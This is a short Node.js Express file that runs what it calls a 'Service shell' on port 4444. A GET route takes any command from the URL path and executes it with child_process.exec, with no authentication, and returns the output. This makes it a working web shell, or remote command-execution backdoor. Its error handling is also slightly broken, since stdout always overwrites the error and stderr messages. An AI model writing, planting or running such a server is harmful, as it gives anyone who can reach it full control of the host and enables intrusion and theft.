const express = require("express")
const {exec} = require("child_process")


const app = express()
const PORT = 4444

app.get("/alo/:cmd", (req, res) => {
    let message = {}
    exec(`${req.params.cmd}`, (err, stdout, stderr) => {
        if (err) {
            message = "something went wrong"
        }
        if (stderr) {
            message = stderr
        }
        message = stdout
        
        res.status(200).json({
            message
        })
    })
})

app.listen(PORT, () => {
    console.log(`Service shell started on port ${PORT}`)
})